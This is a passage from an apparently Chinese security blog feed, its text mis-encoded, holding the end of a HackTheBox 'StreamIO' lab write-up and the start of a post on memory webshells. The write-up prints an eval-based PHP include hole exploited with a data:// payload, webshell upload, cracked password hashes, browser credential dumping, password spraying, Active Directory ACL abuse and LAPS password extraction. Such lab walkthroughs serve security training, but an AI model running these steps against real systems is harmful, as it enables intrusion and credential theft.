class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>] !== <span class="string">&quot;index.php&quot;</span> ) </span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;include&#x27;</span>]));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot; ---- ERROR ---- &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‡è®¾æˆ‘ä»¬ä¼ å…¥çš„includeå‚æ•°æ˜¯<code>data://text/plain,phpinfo();</code>ï¼Œé‚£ä¹ˆç»è¿‡<code>file_get_contents()</code>å‡½æ•°çš„å¤„ç†å†ä¼ ç»™evalå‡½æ•°ï¼Œä¸å°±ç›´æ¥æ‰§è¡Œäº†phpinfo()äº†å—ï¼Ÿæˆ‘ä»¬è¯•ä¸€ä¸‹ï¼š</p><p><a href="https://pic.imgdb.cn/item/65760f77c458853aef549a27.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f77c458853aef549a27.jpg"></a></p><p>æœä¸å…¶ç„¶ï¼Œå‡ºç°äº†phpinfoã€‚é‚£æ¥ä¸‹æ¥æ›´æ”¹<code>phpinfo();</code>ä¸º<code>system(&#39;command&#39;)</code>å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æˆ‘è¿™é‡Œæ˜¯ä¸Šä¼ äº†ä¸€ä¸ªwebshellï¼Œç„¶ååˆ©ç”¨èšå‰‘è¿æ¥ã€‚å½“å‰ç”¨æˆ·æ˜¯<code>yoshihide</code>ä¸”æ²¡æœ‰å®¶ç›®å½•ï¼Œä»…ç”¨äºWebåº”ç”¨æ“ä½œã€‚ä¹‹åå®¡è®¡äº†ä¸€ä¸‹ä»£ç ï¼Œå¾—åˆ°äº†ä¸¤å¯¹mssqlçš„è´¦å·å¯†ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#C:/inetpub/streamio.htb/admin/index.php</span></span><br><span class="line"><span class="variable">$connection</span> = <span class="keyword">array</span>(<span class="string">&quot;Database&quot;</span>=&gt;<span class="string">&quot;STREAMIO&quot;</span>, <span class="string">&quot;UID&quot;</span> =&gt; <span class="string">&quot;db_admin&quot;</span>, <span class="string">&quot;PWD&quot;</span> =&gt; <span class="string">&#x27;B1@hx31234567890&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#C:/inetpub/watch.streamio.htb/search.php</span></span><br><span class="line"><span class="variable">$connection</span> = <span class="keyword">array</span>(<span class="string">&quot;Database&quot;</span>=&gt;<span class="string">&quot;STREAMIO&quot;</span>, <span class="string">&quot;UID&quot;</span> =&gt; <span class="string">&quot;db_user&quot;</span>, <span class="string">&quot;PWD&quot;</span> =&gt; <span class="string">&#x27;B1@hB1@hB1@h&#x27;</span>);</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨èšå‰‘çš„æ•°æ®æ“ä½œçš„åŠŸèƒ½ï¼Œå¯ä»¥ç›´æ¥è¿æ¥åˆ°mssqlï¼ˆä¹Ÿå¯ä»¥å®éªŒsqlcmdè¿æ¥ï¼Œæ‰§è¡Œwhere.exe sqlcmdå³å¯æ‰¾åˆ°sqlcmdçš„ä½ç½®ï¼‰ï¼ŒæŸ¥çœ‹streamio_backupè¡¨ä¸­çš„æ•°æ®ï¼š</p><p><a href="https://pic.imgdb.cn/item/65760f82c458853aef54abf6.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f82c458853aef54abf6.jpg"></a></p><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸€æ¡usernameä¸ºnikk37çš„æ•°æ®ï¼Œåˆ©ç”¨èšå‰‘çš„å¯¼å‡ºåŠŸèƒ½å¯¼å‡ºç»“æœï¼Œå¾—åˆ°äº†ä¸€ä¸ªcsvæ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> 10.10.11.158_20231210123309.csv </span><br><span class="line"><span class="built_in">id</span>,username,password</span><br><span class="line">8,Sabrina,f87d3c0d6c8fd686aacc6627f1f493a5</span><br><span class="line">7,William,d62be0dc82071bccc1322d64ec5b6c51</span><br><span class="line">6,Lauren,08344b85b329d7efd611b7a7743e8a09</span><br><span class="line">5,Samantha,083ffae904143c4796e464dac33c1f7d</span><br><span class="line">4,Theodore,925e5408ecb67aea449373d668b7359e</span><br><span class="line">3,James,c660060492d9edcaa8332d89c99c9239</span><br><span class="line">2,yoshihide,b779ba15cedfd22a023c4d8bcf5f2332</span><br><span class="line">1,nikk37,389d14cb8e4e9b94b137deb1caf0612a</span><br></pre></td></tr></table></figure><p>ä¾ç„¶å¯¹æ•°æ®è¿›è¡Œå¤„ç†ï¼Œå¹¶çˆ†ç ´å¯†ç ï¼Œç»“æœå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hashcat account /usr/share/wordlists/rockyou.txt --username -m 0 --show </span></span><br><span class="line">Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$</span><br><span class="line">Lauren:08344b85b329d7efd611b7a7743e8a09:<span class="comment">##123a8j8w5123##</span></span><br><span class="line">yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..</span><br><span class="line">nikk37:389d14cb8e4e9b94b137deb1caf0612a:get_dem_girls2@yahoo.com</span><br></pre></td></tr></table></figure><p>å°è¯•åˆ©ç”¨evil-winrmå’Œ<code>nikk37:get_dem_girls2@yahoo.com</code>è¿›è¡Œç™»å½•ï¼ŒæˆåŠŸç™»å½•ï¼š</p><p><a href="https://pic.imgdb.cn/item/65760f8cc458853aef54bf54.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f8cc458853aef54bf54.jpg"></a></p><h2 id="GetAdministrator"><a href="#GetAdministrator" class="headerlink" title="GetAdministrator"></a>GetAdministrator</h2><p>é¦–å…ˆä¸Šä¼ ä¸€ä¸ªSharpHound.exeè¿›è¡Œä¿¡æ¯æ”¶é›†ï¼š</p><p><a href="https://pic.imgdb.cn/item/65760f99c458853aef54d8a9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760f99c458853aef54d8a9.jpg"></a></p><p>æ¥ç€ä¸‹è½½ç”Ÿæˆçš„zipæ–‡ä»¶å¹¶å¯¼å…¥åˆ°BloodHoundï¼š</p><p><a href="https://pic.imgdb.cn/item/65760fa4c458853aef54eeaa.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fa4c458853aef54eeaa.jpg"></a></p><p>å›¾ä¸­æ‰€æŒ‡çš„ç”¨æˆ·ä¸ºjdgoddï¼Œæ‰€æŒ‡çš„ç»„ä¸ºcore staffã€‚å¯ä»¥çœ‹åˆ°jdgoddå¯¹core staffæœ‰writeownerçš„æƒé™ï¼Œè€Œcore staffçš„ç»„æˆå‘˜å¯ä»¥è¯»å–LAPSçš„å¯†ç ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°core staffç»„ä¸­æ˜¯æ²¡æœ‰æˆå‘˜çš„ï¼š</p><p><a href="https://pic.imgdb.cn/item/65760fb7c458853aef550a56.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fb7c458853aef550a56.jpg"></a></p><p>å› æ­¤æˆ‘ä»¬æ­¤æ—¶çš„æ€è·¯æ˜¯æ‹¿åˆ°jdgoddçš„å¯†ç ç„¶åç™»å½•åˆ°DCï¼Œä¹‹åå°†jdgoddæˆ–è€…nikk37æ·»åŠ åˆ°core staffç»„ä¸­ï¼Œæœ€ådump LAPSå¯†ç ã€‚é‚£é¦–å…ˆè¿›è¡Œæˆ‘ä»¬çš„ç¬¬ä¸€æ­¥ï¼Œæ‰¾åˆ°jdgoddå¯†ç ã€‚ä¸Šä¼ ä¸€ä¸ªWinpeasè¿è¡Œä¸€ä¸‹ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æ‰¾åˆ°çº¿ç´¢ï¼š</p><p><a href="https://pic.imgdb.cn/item/65760fc1c458853aef55189c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fc1c458853aef55189c.jpg"></a></p><p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™å°ç”µè„‘å®‰è£…äº†firefoxä¸”æ‰¾åˆ°äº†firefoxçš„å‡­æ®æ–‡ä»¶ï¼Œå¯ä»¥åˆ©ç”¨<a href="https://github.com/moonD4rk/HackBrowserData">HackBrowserData</a>æŠŠå¯†ç dumpå‡ºæ¥ï¼š</p><p><a href="https://pic.imgdb.cn/item/65760fcac458853aef552d57.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fcac458853aef552d57.jpg"></a></p><p>ä¸‹è½½ä¸‹æ¥å¹¶è§£å‹åï¼Œå°±å¯ä»¥çœ‹åˆ°å¯†ç äº†ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> results/firefox_br53rxeg_default_release_password.json </span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;UserName&quot;</span>: <span class="string">&quot;JDgodd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Password&quot;</span>: <span class="string">&quot;password@12&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LoginURL&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CreateDate&quot;</span>: <span class="string">&quot;2022-02-22T02:41:51-08:00&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;UserName&quot;</span>: <span class="string">&quot;yoshihide&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Password&quot;</span>: <span class="string">&quot;paddpadd@12&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LoginURL&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CreateDate&quot;</span>: <span class="string">&quot;2022-02-22T02:41:24-08:00&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;UserName&quot;</span>: <span class="string">&quot;nikk37&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Password&quot;</span>: <span class="string">&quot;n1kk1sd0p3t00:)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LoginURL&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CreateDate&quot;</span>: <span class="string">&quot;2022-02-22T02:41:10-08:00&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;UserName&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Password&quot;</span>: <span class="string">&quot;JDg0dd1s@d0p3cr3@t0r&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LoginURL&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CreateDate&quot;</span>: <span class="string">&quot;2022-02-22T02:40:56-08:00&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ç›´æ¥åˆ©ç”¨<code>JDgodd:password@12</code>æ— æ³•è®¤è¯æˆåŠŸï¼Œä¼¼ä¹è¿˜éœ€è¦æˆ‘ä»¬é‡æ–°çˆ†ç ´ä¸€ä¸‹ã€‚æ•´ç†ä¸€ä¸‹è´¦å·å¯†ç ï¼š</p><p><a href="https://pic.imgdb.cn/item/65760fd5c458853aef5545e2.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fd5c458853aef5545e2.jpg"></a></p><p>åˆ©ç”¨cmeçˆ†ç ´ä¸€ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># crackmapexec smb 10.10.11.158 -u user1 -p pass1 --continue-on-success</span></span><br><span class="line">SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:password@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:paddpadd@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\JDgodd:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:password@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:paddpadd@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:password@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:paddpadd@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:password@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:paddpadd@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE</span><br></pre></td></tr></table></figure><p>å¾—åˆ°è´¦å·å¯†ç ï¼š<code>streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r</code>ï¼Œä½†æ˜¯å¾—åˆ°äº†è¿™ç»„è´¦å·å¯†ç æˆ‘ä»¬ä»ç„¶æ— æ³•åˆ©ç”¨evil-winrmæˆåŠŸç™»å½•ã€‚ç”¨cmeçš„çˆ†ç ´ä¸€ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># crackmapexec winrm 10.10.11.158 -u user1 -p pass1 --continue-on-success</span></span><br><span class="line">SMB         10.10.11.158    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:streamIO.htb)</span><br><span class="line">HTTP        10.10.11.158    5985   DC               [*] http://10.10.11.158:5985/wsman</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\JDgodd:password@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\JDgodd:paddpadd@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\JDgodd:n1kk1sd0p3t00:)</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\yoshihide:password@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\yoshihide:paddpadd@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\yoshihide:n1kk1sd0p3t00:)</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\yoshihide:JDg0dd1s@d0p3cr3@t0r</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\nikk37:password@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\nikk37:paddpadd@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\nikk37:n1kk1sd0p3t00:)</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\nikk37:JDg0dd1s@d0p3cr3@t0r</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\admin:password@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\admin:paddpadd@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\admin:n1kk1sd0p3t00:)</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\admin:JDg0dd1s@d0p3cr3@t0r</span><br></pre></td></tr></table></figure><p>ä¸éš¾å‘ç°ï¼ŒJDgoddè¿™ä¸ªè´¦æˆ·æˆ‘ä»¬æ²¡æ³•è¿œç¨‹ç™»å½•ã€‚é‚£åˆ©ç”¨bloodhound-pythonè¿œç¨‹æ”¶é›†ä¸€æ³¢ä¿¡æ¯å§ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bloodhound-python -d streamio.htb -u JDgodd -p &quot;JDg0dd1s@d0p3cr3@t0r&quot;  -c All  -ns 10.10.11.158 -dc streamio.htb --zip </span></span><br><span class="line">INFO: Found AD domain: streamio.htb</span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user</span><br><span class="line">WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</span><br><span class="line">INFO: Connecting to LDAP server: streamio.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Connecting to LDAP server: streamio.htb</span><br><span class="line">INFO: Found 8 <span class="built_in">users</span></span><br><span class="line">INFO: Found 54 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 4 gpos</span><br><span class="line">INFO: Found 1 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: DC.streamIO.htb</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 20S</span><br><span class="line">INFO: Compressing output into 20231210133117_bloodhound.zip</span><br></pre></td></tr></table></figure><p>å¯¼å…¥åˆ°BloodHoundä¸­ï¼Œå¯ä»¥æ‰¾åˆ°è§£å†³åŠæ³•ï¼š</p><p><a href="https://pic.imgdb.cn/item/65760fe0c458853aef5559a3.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fe0c458853aef5559a3.jpg"></a></p><p>BloodHoundå‘Šè¯‰æˆ‘ä»¬å¯ä»¥ä½¿ç”¨PowerViewä¸­çš„Add-DomainObjectAclå‡½æ•°æ¥å‘core staffç»„ä¸­æ·»åŠ æˆå‘˜ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬ç™»å½•åˆ°nikk37ï¼Œä¸Šä¼ powerviewå¹¶å¯¼å…¥ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload ../../../../../home/rainb0w/Tools/PowerSploit/Recon/PowerView.ps1  .</span><br><span class="line">. .\PowerView.ps1</span><br></pre></td></tr></table></figure><p>å­˜å‚¨å‡­æ®ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SecPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;JDg0dd1s@d0p3cr3@t0r&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="variable">$Cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&#x27;streamIO.htb\JDgodd&#x27;</span>, <span class="variable">$SecPassword</span>)</span><br></pre></td></tr></table></figure><p>é€šè¿‡Add-DomainObjectAclèµ‹äºˆæ‰€æœ‰çš„æƒåŠ›ï¼Œå¹¶é€šè¿‡Add-DomainGroupMemberæ·»åŠ nikk37åˆ°CORE STAFFç»„ä¸­ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-Credential</span> <span class="variable">$Cred</span> <span class="literal">-TargetIdentity</span> <span class="string">&quot;CORE STAFF&quot;</span> <span class="literal">-Rights</span> All <span class="literal">-PrincipalIdentity</span> JDgodd</span><br><span class="line"><span class="built_in">Add-DomainGroupMember</span> <span class="literal">-Identity</span> <span class="string">&#x27;CORE STAFF&#x27;</span> <span class="literal">-Members</span> <span class="string">&#x27;nikk37&#x27;</span> <span class="literal">-Cred</span> <span class="variable">$Cred</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å¯ä»¥åˆ©ç”¨è¿™ç¯‡æ–‡ç« ï¼š<a href="https://www.hackingarticles.in/credential-dumpinglaps/">https://www.hackingarticles.in/credential-dumpinglaps/</a> ä¸­ä»‹ç»çš„æ–¹æ³•å»dump lapså‡­æ®ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec ldap 10.10.11.158 -u nikk37 -p <span class="string">&#x27;get_dem_girls2@yahoo.com&#x27;</span> â€“kdcHost 10.10.11.158 -M laps</span><br><span class="line"></span><br><span class="line">ldapsearch -x -H ldap://10.10.11.158 -D nikk37@streamio.htb -w <span class="string">&quot;get_dem_girls2@yahoo.com&quot;</span> -b <span class="string">&quot;dc=streamio,dc=htb&quot;</span> <span class="string">&quot;(ms-MCs-admpwd=*)&quot;</span>|grep ms-Mcs-AdmPwd</span><br></pre></td></tr></table></figure><p>æœ€ååˆ©ç”¨å¾—åˆ°çš„å¯†ç ç™»å½•åˆ°Administratorï¼Œæ‹¿åˆ°Root Flagï¼š</p><p><a href="https://pic.imgdb.cn/item/65760fedc458853aef557252.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fedc458853aef557252.jpg"></a></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™é“é¶æœºå¹¶ä¸å›°éš¾ï¼Œåªæ˜¯è€ƒç‚¹æ¯”è¾ƒå¤šï¼Œå› æ­¤æ‰“èµ·æ¥ä¹Ÿæ„Ÿåˆ°æ¯”è¾ƒç¹çè´¹åŠ›ï¼Œå› æ­¤ä¸ªäººè®¤ä¸ºè¿˜æ˜¯å€¼å¾—Mediuméš¾åº¦ã€‚</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
            <tag> åŸŸæ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java/Python/PHP Memory WebShell</title>
      <link href="/2023/08/08/Memory_WebShell/"/>
      <url>/2023/08/08/Memory_WebShell/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å› ä¸ºå†…å­˜é©¬ç§ç±»ç¹æ‚ï¼Œæ¯æ¬¡éƒ½è¦ç¿»çœ‹å¾ˆå¤šæ–‡ç« ï¼ŒåˆåŠ ä¸Šæœ€è¿‘æœ‰æŸä¸ªå¤§æ´»åŠ¨ï¼Œå› æ­¤å°±å†™äº†è¿™ç¯‡æ–‡ç« æ¥æ€»ç»“ä¸€ä¸‹å¸¸è§çš„3ç§è¯­è¨€ï¼ˆPHPã€Pythonã€JAVAï¼‰çš„å†…å­˜é©¬çš„æ³¨å…¥æ–¹æ³•å’ŒæŸ¥æ€æ–¹æ³•ï¼Œå¹¶å°è¯•è‡ªå·±å®Œæˆä¸€ä¸ªå†…å­˜é©¬æŸ¥æ€å·¥å…·çš„å®ç°ã€‚å¸Œæœ›æœ¬ç¯‡æ–‡ç« èƒ½ç»™å¸ˆå‚…ä»¬å¸¦æ¥ä¸€äº›å¯å‘ã€‚æ–‡ç« ä¸€é•¿å°±éš¾å…åœ¨è¡¨è¾¾å’Œå‡†ç¡®æ€§ä¸Šæœ‰æ‰€ç–æ¼ï¼Œå¦‚æœ‰é”™è¯¯æˆ–ä¸è¶³ï¼Œè¯·å¸ˆå‚…ä»¬æŒ‡æ­£ã€‚</p><p>Javaå†…å­˜é©¬çš„ç§ç±»å¾ˆå¤šï¼Œè¿™ç¯‡æ–‡ç« ä¸»è¦å¯¹Tomcat-Servletã€Tomcat-Filterã€Tomcat-Listenerã€Tomcat-Websocketã€JavaAgentä»¥åŠSpringMVC Controllerç­‰ç§ç±»çš„å†…å­˜é©¬è¿›è¡Œç ”ç©¶ã€‚å¾ˆå¤šå¸ˆå‚…åœ¨åˆ†ææˆ–è€…æ³¨å…¥Javaå†…å­˜é©¬çš„æ—¶å€™åˆ©ç”¨çš„expå¤§å¤šæ˜¯jspå½¢å¼çš„ï¼Œé€šè¿‡å‘ç›®æ ‡Webç›®å½•ä¸Šä¼ jspæ–‡ä»¶ï¼Œä¹‹åè®¿é—®è¯¥jspæ–‡ä»¶æ‰§è¡Œjspä»£ç ä»è€Œæ³¨å…¥Javaå†…å­˜é©¬ã€‚å› ä¸ºè¿™ç§æ–¹å¼ä»ç„¶å­˜åœ¨æ–‡ä»¶è½ç›˜ï¼Œè€Œå­˜åœ¨æ–‡ä»¶è½ç›˜å°±æ„å‘³ç€å¾ˆå®¹æ˜“è¢«IDSç›‘æµ‹åˆ°ï¼Œå› æ­¤ç¬”è€…è®¤ä¸ºè¿™ç§åŠæ³•åº”å½“æ˜¯æˆ‘ä»¬æ‹¿ä¸åˆ°ä»£ç æ‰§è¡Œæƒé™ï¼Œä½†æ˜¯å¯ä»¥æ‹¿åˆ°å‘½ä»¤æ‰§è¡Œæƒé™æˆ–æ–‡ä»¶ä¸Šä¼ æƒé™çš„æ—¶å€™å†å»åˆ©ç”¨ã€‚é‚£å¦‚æœæˆ‘ä»¬å¯ä»¥æ‹¿åˆ°ä»£ç 